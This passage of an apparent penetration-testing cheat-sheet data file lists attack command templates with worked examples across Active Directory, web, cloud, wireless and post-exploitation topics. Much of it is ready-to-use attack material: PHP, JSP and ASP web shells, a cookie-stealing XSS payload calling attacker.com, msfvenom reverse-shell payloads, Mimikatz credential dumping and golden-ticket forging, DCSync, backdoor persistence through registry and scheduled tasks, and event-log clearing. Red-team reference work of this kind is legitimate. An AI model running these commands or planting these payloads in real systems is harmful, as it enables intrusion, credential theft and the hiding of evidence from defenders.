            command: 'GetNPUsers.py {domain}/ -dc-ip {dc_ip} -usersfile {users_file} -format hashcat',
            description: 'Kerberos AS-REP Roasting (pre-auth disabled)',
            example: 'GetNPUsers.py contoso.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat'
          },
          {
            command: 'responder -I {interface} -A',
            description: 'Capture NTLM hashes using Responder',
            example: 'responder -I eth0 -A'
          }
        ]
      },
      {
        name: 'Host Reconnaissance',
        description: 'Gathering information after gaining access to a host',
        commands: [
          {
            command: 'systeminfo',
            description: 'Get detailed system information',
          },
          {
            command: 'net user',
            description: 'List all local users',
          },
          {
            command: 'net localgroup administrators',
            description: 'List members of the local administrators group',
          },
          {
            command: 'netstat -ano',
            description: 'Show active network connections',
          },
          {
            command: 'schtasks /query /fo LIST /v',
            description: 'List all scheduled tasks',
          },
          {
            command: 'wmic product get name,version',
            description: 'List installed software',
          }
        ]
      },
      {
        name: 'Lateral Movement',
        description: 'Techniques for moving laterally within an AD environment',
        commands: [
          {
            command: 'wmiexec.py {domain}/{user}:{password}@{target}',
            description: 'Execute commands via WMI',
            example: 'wmiexec.py contoso/administrator:password@192.168.1.10'
          },
          {
            command: 'smbexec.py {domain}/{user}:{password}@{target}',
            description: 'Execute commands via SMB',
            example: 'smbexec.py contoso/administrator:password@192.168.1.10'
          },
          {
            command: 'psexec.py {domain}/{user}:{password}@{target}',
            description: 'Execute commands via PsExec',
            example: 'psexec.py contoso/administrator:password@192.168.1.10'
          },
          {
            command: 'Enter-PSSession -ComputerName {target}',
            description: 'Start PowerShell remote session',
            example: 'Enter-PSSession -ComputerName DC01'
          },
          {
            command: 'mimikatz "sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash}"',
            description: 'Pass-the-Hash with Mimikatz',
            example: 'mimikatz "sekurlsa::pth /user:administrator /domain:contoso /ntlm:a1b2c3d4e5f6g7h8i9j0"'
          }
        ]
      },
      {
        name: 'Domain Enumeration',
        description: 'Gathering information about the domain structure',
        commands: [
          {
            command: 'net user /domain',
            description: 'List all domain users',
          },
          {
            command: 'net group /domain',
            description: 'List all domain groups',
          },
          {
            command: 'powerview> Get-NetUser',
            description: 'PowerView: Get information about domain users',
          },
          {
            command: 'powerview> Get-NetGroup',
            description: 'PowerView: Get information about domain groups',
          },
          {
            command: 'powerview> Get-DomainController',
            description: 'PowerView: Get domain controllers',
          },
          {
            command: 'bloodhound-python -d {domain} -u {user} -p {password} -c All',
            description: 'Collect data for BloodHound analysis',
            example: 'bloodhound-python -d contoso.local -u user -p password -c All'
          }
        ]
      },
      {
        name: 'Kerberos Attacks',
        description: 'Attacks targeting Kerberos authentication',
        commands: [
          {
            command: 'GetUserSPNs.py -request {domain}/{user}:{password}',
            description: 'Kerberoast: Request service tickets for SPN accounts',
            example: 'GetUserSPNs.py -request contoso.local/user:password'
          },
          {
            command: 'GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile hashes.txt',
            description: 'AS-REP Roasting: Get hashes for users without Kerberos pre-auth',
            example: 'GetNPUsers.py contoso.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt'
          },
          {
            command: 'mimikatz "kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /id:500 /ptt"',
            description: 'Create and inject a Golden Ticket',
            example: 'mimikatz "kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:deadbeefdeadbeefdeadbeefdeadbeef /id:500 /ptt"'
          },
          {
            command: 'mimikatz "kerberos::silver /target:{service} /service:{svc_type} /user:{user} /domain:{domain} /sid:{domain_sid} /rc4:{service_hash} /ptt"',
            description: 'Create and inject a Silver Ticket',
            example: 'mimikatz "kerberos::silver /target:dc01.contoso.local /service:cifs /user:Administrator /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:deadbeefdeadbeefdeadbeefdeadbeef /ptt"'
          }
        ]
      },
      {
        name: 'Domain Privilege Escalation',
        description: 'Techniques for escalating privileges within a domain',
        commands: [
          {
            command: 'powerview> Find-DomainShare',
            description: 'PowerView: Find accessible shares in the domain',
          },
          {
            command: 'powerview> Get-DomainUser -Identity "krbtgt" -Properties samaccountname,objectsid',
            description: 'PowerView: Get information about the KRBTGT account',
          },
          {
            command: 'powerview> Find-LocalAdminAccess',
            description: 'PowerView: Find machines where current user has admin rights',
          },
          {
            command: 'powerview> Add-DomainGroupMember -Identity "Domain Admins" -Members targetUser',
            description: 'PowerView: Add user to Domain Admins group',
          },
          {
            command: 'mimikatz "lsadump::dcsync /domain:{domain} /user:{domain_admin}"',
            description: 'DCSync attack to extract password hashes',
            example: 'mimikatz "lsadump::dcsync /domain:contoso.local /user:administrator"'
          }
        ]
      }
    ]
  },
  {
    name: 'Cloud Security',
    icon: <Cloud className="w-5 h-5" />,
    description: 'Cloud platform security testing techniques',
    subcategories: [
      {
        name: 'AWS Enumeration',
        description: 'Amazon Web Services reconnaissance and enumeration',
        commands: [
          {
            command: 'aws sts get-caller-identity',
            description: 'Get current AWS identity information',
          },
          {
            command: 'aws s3 ls',
            description: 'List all S3 buckets',
          },
          {
            command: 'aws s3 ls s3://{bucket_name} --recursive',
            description: 'List contents of specific S3 bucket',
            example: 'aws s3 ls s3://company-backups --recursive'
          },
          {
            command: 'aws ec2 describe-instances',
            description: 'List all EC2 instances',
          },
          {
            command: 'aws iam list-users',
            description: 'List all IAM users',
          },
          {
            command: 'aws iam get-account-authorization-details',
            description: 'Get detailed account authorization information',
          },
          {
            command: 'aws lambda list-functions',
            description: 'List all Lambda functions',
          },
          {
            command: 'aws rds describe-db-instances',
            description: 'List all RDS database instances',
          }
        ]
      },
      {
        name: 'Azure Enumeration',
        description: 'Microsoft Azure reconnaissance and enumeration',
        commands: [
          {
            command: 'az account show',
            description: 'Show current Azure account information',
          },
          {
            command: 'az vm list',
            description: 'List all virtual machines',
          },
          {
            command: 'az storage account list',
            description: 'List all storage accounts',
          },
          {
            command: 'az ad user list',
            description: 'List all Azure AD users',
          },
          {
            command: 'az keyvault list',
            description: 'List all Key Vaults',
          },
          {
            command: 'az webapp list',
            description: 'List all web applications',
          },
          {
            command: 'az sql server list',
            description: 'List all SQL servers',
          }
        ]
      },
      {
        name: 'GCP Enumeration',
        description: 'Google Cloud Platform reconnaissance and enumeration',
        commands: [
          {
            command: 'gcloud auth list',
            description: 'List authenticated accounts',
          },
          {
            command: 'gcloud projects list',
            description: 'List all projects',
          },
          {
            command: 'gcloud compute instances list',
            description: 'List all compute instances',
          },
          {
            command: 'gcloud storage buckets list',
            description: 'List all storage buckets',
          },
          {
            command: 'gcloud iam service-accounts list',
            description: 'List all service accounts',
          },
          {
            command: 'gcloud functions list',
            description: 'List all cloud functions',
          }
        ]
      },
      {
        name: 'Container Security',
        description: 'Docker and Kubernetes security testing',
        commands: [
          {
            command: 'docker ps -a',
            description: 'List all Docker containers',
          },
          {
            command: 'docker images',
            description: 'List all Docker images',
          },
          {
            command: 'docker exec -it {container_id} /bin/bash',
            description: 'Execute shell in running container',
            example: 'docker exec -it abc123 /bin/bash'
          },
          {
            command: 'kubectl get pods --all-namespaces',
            description: 'List all Kubernetes pods',
          },
          {
            command: 'kubectl get secrets --all-namespaces',
            description: 'List all Kubernetes secrets',
          },
          {
            command: 'kubectl describe pod {pod_name}',
            description: 'Get detailed information about a pod',
            example: 'kubectl describe pod nginx-deployment-abc123'
          },
          {
            command: 'docker run --rm -v /:/host -it alpine chroot /host /bin/bash',
            description: 'Container escape via host filesystem mount',
          }
        ]
      }
    ]
  },
  {
    name: 'Web Attacks',
    icon: <Globe className="w-5 h-5" />,
    description: 'Web application testing techniques',
    subcategories: [
      {
        name: 'Reconnaissance',
        description: 'Information gathering about web applications',
        commands: [
          {
            command: 'whatweb {url}',
            description: 'Identify web technologies and CMS',
            example: 'whatweb https://example.com'
          },
          {
            command: 'gobuster dir -u {url} -w {wordlist}',
            description: 'Directory brute forcing with Gobuster',
            example: 'gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'
          },
          {
            command: 'wpscan --url {url}',
            description: 'WordPress vulnerability scanner',
            example: 'wpscan --url https://example.com'
          },
          {
            command: 'nikto -h {target}',
            description: 'Web server scanner for vulnerabilities',
            example: 'nikto -h https://example.com'
          },
          {
            command: 'curl -I {url}',
            description: 'Check HTTP headers for information disclosure',
            example: 'curl -I https://example.com'
          }
        ]
      },
      {
        name: 'Injection',
        description: 'Injection attack techniques',
        commands: [
          {
            command: 'sqlmap -u "{url}" --forms --batch',
            description: 'Automated SQL injection testing',
            example: 'sqlmap -u "https://example.com/page.php?id=1" --forms --batch'
          },
          {
            command: 'sqlmap -u "{url}" --data="{post_data}" --dbs',
            description: 'SQL injection with POST data, enumerate databases',
            example: 'sqlmap -u "https://example.com/login.php" --data="username=admin&password=test" --dbs'
          },
          {
            command: 'sqlmap -u "{url}" -p {parameter} --level=5 --risk=3',
            description: 'Aggressive SQL injection against specific parameter',
            example: 'sqlmap -u "https://example.com/page.php?id=1" -p id --level=5 --risk=3'
          },
          {
            command: '<?php system($_GET["cmd"]); ?>',
            description: 'Basic PHP web shell',
            example: '<?php system($_GET["cmd"]); ?> saved as shell.php, then access as: example.com/shell.php?cmd=whoami'
          },
          {
            command: '<script>fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)</script>',
            description: 'Basic XSS payload to steal cookies',
          }
        ]
      },
      {
        name: 'Authentication',
        description: 'Authentication bypass and brute forcing',
        commands: [
          {
            command: 'hydra -l {username} -P {wordlist} {target} http-post-form "{path}:{form_data}:{failure_message}"',
            description: 'Brute force HTTP POST form',
            example: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"'
          },
          {
            command: 'wfuzz -c -w {wordlist} --hc 404 {url}/FUZZ',
            description: 'Fuzz for directories/files, hide 404 responses',
            example: 'wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 https://example.com/FUZZ'
          },
          {
            command: 'medusa -h {target} -u {username} -P {wordlist} -M http -m DIR:{login_path}',
            description: 'Brute force HTTP authentication with Medusa',
            example: 'medusa -h example.com -u admin -P passwords.txt -M http -m DIR:/admin'
          },
          {
            command: 'ffuf -w {wordlist} -u {url}/FUZZ -fc 404',
            description: 'Fast web fuzzer, filter out 404 responses',
            example: 'ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -fc 404'
          },
          {
            command: 'burpsuite --project-file={project} --config-file={config}',
            description: 'Launch Burp Suite with specific project and config',
            example: 'burpsuite --project-file=test.burp --config-file=config.json'
          }
        ]
      },
      {
        name: 'File Upload',
        description: 'File upload vulnerability exploitation',
        commands: [
          {
            command: 'echo "<?php system($_GET[\'cmd\']); ?>" > shell.php',
            description: 'Create simple PHP web shell',
          },
          {
            command: 'echo "GIF89a<?php system($_GET[\'cmd\']); ?>" > shell.gif.php',
            description: 'Create PHP shell with GIF header bypass',
          },
          {
            command: 'msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php',
            description: 'Generate PHP Meterpreter payload',
            example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php'
          },
          {
            command: 'echo "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>" > shell.jsp',
            description: 'Create JSP web shell',
          },
          {
            command: 'echo "<% eval request(\"cmd\") %>" > shell.asp',
            description: 'Create ASP web shell',
          }
        ]
      },
      {
        name: 'API Testing',
        description: 'REST API and GraphQL security testing',
        commands: [
          {
            command: 'curl -X GET -H "Authorization: Bearer {token}" {api_url}',
            description: 'Test API endpoint with Bearer token',
            example: 'curl -X GET -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." https://api.example.com/users'
          },
          {
            command: 'curl -X POST -H "Content-Type: application/json" -d \'{json_data}\' {api_url}',
            description: 'Send POST request with JSON data',
            example: 'curl -X POST -H "Content-Type: application/json" -d \'{"username":"admin","password":"test"}\' https://api.example.com/login'
          },
          {
            command: 'wfuzz -c -z file,{wordlist} -H "Authorization: Bearer FUZZ" {api_url}',
            description: 'Fuzz API tokens',
            example: 'wfuzz -c -z file,tokens.txt -H "Authorization: Bearer FUZZ" https://api.example.com/admin'
          },
          {
            command: 'graphql-voyager --introspect {graphql_endpoint}',
            description: 'Visualize GraphQL schema',
            example: 'graphql-voyager --introspect https://api.example.com/graphql'
          },
          {
            command: 'curl -X POST -H "Content-Type: application/json" -d \'{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}\' {graphql_url}',
            description: 'GraphQL introspection query',
            example: 'curl -X POST -H "Content-Type: application/json" -d \'{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}\' https://api.example.com/graphql'
          }
        ]
      },
      {
        name: 'Session Management',
        description: 'Session hijacking and manipulation techniques',
        commands: [
          {
            command: 'curl -b "PHPSESSID={session_id}" {url}',
            description: 'Use specific session cookie',
            example: 'curl -b "PHPSESSID=abc123def456" https://example.com/admin'
          },
          {
            command: 'python3 -c "import jwt; print(jwt.decode(\'{token}\', verify=False))"',
            description: 'Decode JWT token without verification',
            example: 'python3 -c "import jwt; print(jwt.decode(\'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...\', verify=False))"'
          },
          {
            command: 'hashcat -m 16500 jwt.txt {wordlist}',
            description: 'Crack JWT HMAC signature',
            example: 'hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt'
          },
          {
            command: 'feroxbuster -u {url} -w {wordlist} -C {cookies}',
            description: 'Directory brute force with cookies',
            example: 'feroxbuster -u https://example.com -w /usr/share/wordlists/dirb/common.txt -C "PHPSESSID=abc123"'
          },
          {
            command: 'python jwt_tool.py {jwt_token} -T',
            description: 'Test JWT token for vulnerabilities',
            example: 'python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U -T'
          }
        ]
      },
      {
        name: 'File Upload Exploits',
        description: 'Advanced file upload exploitation techniques',
        commands: [
          {
            command: 'weevely generate {password} {output_file}',
            description: 'Generate a PHP webshell with weevely',
            example: 'weevely generate P@ssw0rd shell.php'
          },
          {
            command: 'weevely {url} {password}',
            description: 'Connect to a weevely webshell',
            example: 'weevely https://example.com/uploads/shell.php P@ssw0rd'
          },
          {
            command: 'GIF89a;<?php system($_GET["cmd"]); ?>',
            description: 'PHP code disguised as a GIF image',
            example: 'Save as image.php.gif or image.gif, then rename after upload if possible'
          },
          {
            command: 'msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php',
            description: 'Generate a PHP meterpreter shell',
            example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php'
          }
        ]
      }
    ]
  },
  {
    name: 'Post Exploitation',
    icon: <Terminal className="w-5 h-5" />,
    description: 'Post-exploitation techniques',
    subcategories: [
      {
        name: 'Data Exfiltration',
        description: 'Methods to extract data from compromised systems',
        commands: [
          {
            command: 'nc -lvnp {port} > {output_file}',
            description: 'Set up netcat listener to receive data',
            example: 'nc -lvnp 4444 > received_data.txt'
          },
          {
            command: 'cat {file} | base64',
            description: 'Base64 encode a file for exfiltration',
            example: 'cat /etc/passwd | base64'
          },
          {
            command: 'scp {file} {user}@{target}:{remote_path}',
            description: 'Secure copy file to remote system',
            example: 'scp data.zip user@192.168.1.10:/tmp/'
          },
          {
            command: 'python -m SimpleHTTPServer {port}',
            description: 'Start a simple HTTP server (Python 2)',
            example: 'python -m SimpleHTTPServer 8000'
          },
          {
            command: 'python3 -m http.server {port}',
            description: 'Start a simple HTTP server (Python 3)',
            example: 'python3 -m http.server 8000'
          }
        ]
      },
      {
        name: 'Persistence',
        description: 'Techniques to maintain access',
        commands: [
          {
            command: 'echo "{ssh_key}" >> ~/.ssh/authorized_keys',
            description: 'Add SSH key for persistence',
            example: 'echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> ~/.ssh/authorized_keys'
          },
          {
            command: 'crontab -e',
            description: 'Edit user crontab for persistence',
          },
          {
            command: 'schtasks /create /sc minute /mo {minutes} /tn "{name}" /tr {command}',
            description: 'Create scheduled task on Windows',
            example: 'schtasks /create /sc minute /mo 5 /tn "Updater" /tr "C:\\backdoor.exe"'
          },
          {
            command: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{command}" /f',
            description: 'Add startup registry key for persistence',
            example: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\backdoor.exe" /f'
          },
          {
            command: 'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
            description: 'Create WMI permanent event subscription (Part 1)',
            example: 'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="filtP1", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
          }
        ]
      },
      {
        name: 'Credential Extraction',
        description: 'Extract credentials from compromised systems',
        commands: [
          {
            command: 'mimikatz "privilege::debug" "sekurlsa::logonpasswords"',
            description: 'Extract passwords from memory with Mimikatz',
          },
          {
            command: 'reg save HKLM\\System system.hive && reg save HKLM\\SAM sam.hive',
            description: 'Extract SAM and SYSTEM hives for offline processing',
          },
          {
            command: 'secretsdump.py -ntds {ntds_file} -system {system_hive} LOCAL',
            description: 'Extract hashes from NTDS.dit and SYSTEM hive',
            example: 'secretsdump.py -ntds ntds.dit -system system.hive LOCAL'
          },
          {
            command: 'findstr /si password *.txt *.ini *.config *.xml',
            description: 'Find passwords in Windows configuration files',
          },
          {
            command: 'grep -r "password\\|passwd\\|pwd" /etc/ 2>/dev/null',
            description: 'Find passwords in Linux configuration files',
          }
        ]
      },
      {
        name: 'Covering Tracks',
        description: 'Techniques to cover your tracks',
        commands: [
          {
            command: 'history -c',
            description: 'Clear bash history',
          },
          {
            command: 'unset HISTFILE',
            description: 'Disable bash history logging',
          },
          {
            command: 'export HISTSIZE=0',
            description: 'Set history size to zero',
          },
          {
            command: 'wevtutil cl System',
            description: 'Clear Windows System event log',
          },
          {
            command: 'wevtutil cl Security',
            description: 'Clear Windows Security event log',
          },
          {
            command: 'wevtutil cl Application',
            description: 'Clear Windows Application event log',
          }
        ]
      }
    ]
  },
  {
    name: 'C2 Frameworks',
    icon: <Shield className="w-5 h-5" />,
    description: 'Command and Control frameworks',
    subcategories: [
      {
        name: 'Cobalt Strike',
        description: 'Cobalt Strike commands and techniques',
        commands: [
          {
            command: './teamserver {ip} {password} {c2profile}',
            description: 'Start Cobalt Strike team server',
            example: './teamserver 192.168.1.2 P@ssw0rd c2.profile'
          },
          {
            command: 'sleep 30 60',
            description: 'Set beacon sleep time (30s with 60% jitter)',
          },
          {
            command: 'make_token {domain}\\{user} {password}',
            description: 'Create a token to impersonate user',
            example: 'make_token CONTOSO\\administrator P@ssw0rd'
          },
          {
            command: 'spawnas {domain}\\{user} {password} {listener}',
            description: 'Spawn a beacon as different user',
            example: 'spawnas CONTOSO\\administrator P@ssw0rd smb'
          },
          {
            command: 'jump psexec64 {target} {listener}',
            description: 'Lateral movement using psexec',
            example: 'jump psexec64 192.168.1.10 smb'
          }
        ]
      },
      {
        name: 'Metasploit',
        description: 'Metasploit Framework commands',
        commands: [
          {
            command: 'msfconsole',
            description: 'Start Metasploit Framework console',
          },
          {
            command: 'use {module}',
            description: 'Select a module to use',
            example: 'use exploit/windows/smb/ms17_010_eternalblue'
          },
          {
            command: 'set RHOSTS {target}',
            description: 'Set remote target(s)',
            example: 'set RHOSTS 192.168.1.10'
          },
          {
            command: 'set PAYLOAD {payload}',
            description: 'Set payload to use',
            example: 'set PAYLOAD windows/meterpreter/reverse_tcp'
          },
          {
            command: 'set LHOST {ip}',
            description: 'Set local host for callbacks',
            example: 'set LHOST 192.168.1.2'
          },
          {
            command: 'run',
            description: 'Execute the module',
          }
        ]
      },
      {
        name: 'PowerShell Empire',
        description: 'PowerShell Empire commands',
        commands: [
          {
            command: 'listeners',
            description: 'Manage listeners in Empire',
          },
          {
            command: 'uselistener {listener_type}',
            description: 'Select a listener type',
            example: 'uselistener http'
          },
          {
            command: 'usestager {stager}',
            description: 'Select a stager',
            example: 'usestager windows/launcher_bat'
          },
          {
            command: 'usemodule {module}',
            description: 'Select a module',
            example: 'usemodule credentials/mimikatz/logonpasswords'
          },
          {
            command: 'agents',
            description: 'List all agents',
          }
        ]
      }
    ]
  },
  {
    name: 'Cloud',
    icon: <Cloud className="w-5 h-5" />,
    description: 'Cloud attacks and techniques',
    subcategories: [
      {
        name: 'Azure Attacks',
        description: 'Microsoft Azure attack techniques',
        commands: [
          {
            command: 'az login',
            description: 'Authenticate to Azure CLI',
          },
          {
            command: 'az account list',
            description: 'List all subscriptions for logged in account',
          },
          {
            command: 'az account set --subscription "{subscription_id}"',
            description: 'Set active subscription',
            example: 'az account set --subscription "00000000-0000-0000-0000-000000000000"'
          },
          {
            command: 'az group list',
            description: 'List all resource groups',
          },
          {
            command: 'az vm list -g {resource_group}',
            description: 'List all VMs in a resource group',
            example: 'az vm list -g myResourceGroup'
          }
        ]
      },
      {
        name: 'AWS Attacks',
        description: 'Amazon Web Services attack techniques',
        commands: [
          {
            command: 'aws configure',
            description: 'Configure AWS CLI with credentials',
          },
          {
            command: 'aws sts get-caller-identity',
            description: 'Show current IAM identity information',
          },
          {
            command: 'aws s3 ls',
            description: 'List all S3 buckets',
          },
          {
            command: 'aws s3 ls s3://{bucket_name}/',
            description: 'List all objects in an S3 bucket',
            example: 'aws s3 ls s3://my-bucket/'
          },
          {
            command: 'aws ec2 describe-instances',
            description: 'List all EC2 instances',
          }
        ]
      },
      {
        name: 'GCP Attacks',
        description: 'Google Cloud Platform attack techniques',
        commands: [
          {
            command: 'gcloud auth login',
            description: 'Authenticate to Google Cloud SDK',
          },
          {
            command: 'gcloud projects list',
            description: 'List all accessible projects',
          },
          {
            command: 'gcloud config set project {project_id}',
            description: 'Set active project',
            example: 'gcloud config set project my-project'
          },
          {
            command: 'gcloud compute instances list',
            description: 'List all compute instances',
          },
          {
            command: 'gcloud storage ls',
            description: 'List all storage buckets',
          }
        ]
      }
    ]
  },
  {
    name: 'Wireless Security',
    icon: <Zap className="w-5 h-5" />,
    description: 'Wireless network security testing techniques',
    subcategories: [
      {
        name: 'WiFi Reconnaissance',
        description: 'Wireless network discovery and analysis',
        commands: [
          {
            command: 'iwconfig',
            description: 'Display wireless interface configuration',
          },
          {
            command: 'airmon-ng start {interface}',
            description: 'Enable monitor mode on wireless interface',
            example: 'airmon-ng start wlan0'
          },
          {
            command: 'airodump-ng {interface}',
            description: 'Scan for wireless networks',
            example: 'airodump-ng wlan0mon'
          },
          {
            command: 'airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}',
            description: 'Target specific network for capture',
            example: 'airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon'
          },
          {
            command: 'wash -i {interface}',
            description: 'Scan for WPS-enabled networks',
            example: 'wash -i wlan0mon'
          }
        ]
      },
      {
        name: 'WiFi Attacks',
        description: 'Wireless network exploitation techniques',
        commands: [
          {
            command: 'aireplay-ng -0 {count} -a {bssid} -c {client} {interface}',
            description: 'Deauthentication attack',
            example: 'aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon'
          },
          {
            command: 'aircrack-ng -w {wordlist} {capture_file}',
            description: 'Crack WPA/WPA2 handshake',
            example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap'
          },
          {
            command: 'hashcat -m 22000 {hash_file} {wordlist}',
            description: 'Crack WPA/WPA2 with hashcat',
            example: 'hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt'
          },
          {
            command: 'reaver -i {interface} -b {bssid} -vv',
            description: 'WPS PIN brute force attack',
            example: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv'
          },
          {
            command: 'wifite --wpa --dict {wordlist}',
            description: 'Automated wireless attack tool',
            example: 'wifite --wpa --dict /usr/share/wordlists/rockyou.txt'
          }
        ]
      },
      {
        name: 'Evil Twin',
        description: 'Rogue access point creation and management',
        commands: [
          {
            command: 'hostapd {config_file}',
            description: 'Start access point with hostapd',
            example: 'hostapd /etc/hostapd/hostapd.conf'
          },
          {
            command: 'dnsmasq -C {config_file}',
            description: 'Start DHCP/DNS server',
            example: 'dnsmasq -C /etc/dnsmasq.conf'
          },
          {
            command: 'iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE',
            description: 'Enable NAT for internet sharing',
            example: 'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'
          },
          {
            command: 'fluxion',
            description: 'Automated evil twin attack framework',
          },
          {
            command: 'wifiphisher -aI {interface} -e {essid}',
            description: 'Automated phishing attack against WiFi users',
            example: 'wifiphisher -aI wlan0 -e "Free WiFi"'
          }
        ]
      }
    ]
  },
  {
    name: 'Mobile App Testing',
    icon: <HelpCircle className="w-5 h-5" />,
    description: 'Basic mobile application security testing',
    subcategories: [
      {
        name: 'Android Testing',
        description: 'Android application security testing',
        commands: [
          {
            command: 'adb devices',
            description: 'List connected Android devices',
          },
          {
            command: 'adb shell',
            description: 'Open shell on Android device',
          },
          {
            command: 'adb install {apk_file}',
            description: 'Install APK on device',
            example: 'adb install app.apk'
          },
          {
            command: 'adb pull {device_path} {local_path}',
            description: 'Pull file from device',
            example: 'adb pull /data/data/com.app/databases/app.db ./app.db'
          },
          {
            command: 'jadx -d {output_dir} {apk_file}',
            description: 'Decompile APK with JADX',
            example: 'jadx -d ./decompiled app.apk'
          },
          {
            command: 'apktool d {apk_file}',
            description: 'Disassemble APK with apktool',
            example: 'apktool d app.apk'
          },
          {
            command: 'frida -U -f {package_name} -l {script}',
            description: 'Hook Android app with Frida',
            example: 'frida -U -f com.example.app -l hook.js'
          }
        ]
      },
      {
        name: 'iOS Testing',
        description: 'iOS application security testing',
        commands: [
          {
            command: 'ideviceinstaller -l',
            description: 'List installed iOS applications',
          },
          {
            command: 'ideviceinstaller -i {ipa_file}',
            description: 'Install IPA on device',
            example: 'ideviceinstaller -i app.ipa'
          },
          {
            command: 'class-dump -H {binary} -o {output_dir}',
            description: 'Dump Objective-C class information',
            example: 'class-dump -H ./App -o ./headers'
          },
          {
            command: 'otool -L {binary}',
            description: 'List shared libraries used by binary',
            example: 'otool -L ./App'
          },
          {
            command: 'frida -U -f {bundle_id} -l {script}',
            description: 'Hook iOS app with Frida',
            example: 'frida -U -f com.example.app -l hook.js'
          },
          {
            command: 'cycript -p {process_name}',
            description: 'Runtime manipulation with Cycript',
            example: 'cycript -p SpringBoard'
          }
        ]
      }
    ]
  },
  {
    name: 'OSINT',
    icon: <Search className="w-5 h-5" />,
    description: 'Open Source Intelligence gathering techniques',
    subcategories: [
      {
        name: 'Domain Intelligence',
        description: 'Domain and subdomain reconnaissance',
        commands: [
          {
            command: 'subfinder -d {domain}',
            description: 'Find subdomains using multiple sources',
            example: 'subfinder -d example.com'
          },
          {
            command: 'assetfinder {domain}',
            description: 'Find domains and subdomains',
            example: 'assetfinder example.com'
          },
          {
            command: 'amass enum -d {domain}',
            description: 'Comprehensive subdomain enumeration',
            example: 'amass enum -d example.com'
          },
          {
            command: 'dig {domain} ANY',
            description: 'DNS record enumeration',
            example: 'dig example.com ANY'
          },
          {
            command: 'dnsrecon -d {domain} -t axfr',
            description: 'DNS zone transfer attempt',
            example: 'dnsrecon -d example.com -t axfr'
          },
          {
            command: 'fierce -dns {domain}',
            description: 'DNS scanner for locating non-contiguous IP space',
            example: 'fierce -dns example.com'
          }
        ]
      },
      {
        name: 'Social Media Intelligence',
        description: 'Social media and people search techniques',
        commands: [
          {
            command: 'sherlock {username}',
            description: 'Find username across social networks',
            example: 'sherlock john_doe'
          },
          {
            command: 'twint -u {username} --limit 100',
            description: 'Twitter intelligence gathering',
            example: 'twint -u target_user --limit 100'
          },
          {
            command: 'instagram-py -u {username}',
            description: 'Instagram profile information gathering',
            example: 'instagram-py -u target_user'
          },
          {
            command: 'linkedin2username -c "{company_name}"',
            description: 'Generate usernames from LinkedIn company employees',
            example: 'linkedin2username -c "Target Company Inc"'
          },
          {
            command: 'holehe {email}',
            description: 'Check if email is used on different sites',
            example: 'holehe target@example.com'
          }
        ]
      },
      {
        name: 'Metadata Analysis',
        description: 'File and image metadata extraction',
        commands: [
          {
            command: 'exiftool {file}',
            description: 'Extract metadata from files',
            example: 'exiftool document.pdf'
          },
          {
            command: 'metagoofil -d {domain} -t pdf,doc,xls -l 100 -n 25 -o {output_dir}',
            description: 'Extract metadata from public documents',
            example: 'metagoofil -d example.com -t pdf,doc,xls -l 100 -n 25 -o ./results'
          },
          {
            command: 'foca',
            description: 'Fingerprinting Organizations with Collected Archives',
          },
          {
            command: 'strings {file} | grep -i {pattern}',
            description: 'Search for strings in binary files',
            example: 'strings document.pdf | grep -i password'
          }
        ]
      }
    ]
  },
  {
    name: 'OSINT & Reconnaissance',
    icon: <Eye className="w-5 h-5" />,
    description: 'Open Source Intelligence gathering and reconnaissance techniques',
    subcategories: [
      {
        name: 'Domain & Subdomain Discovery',
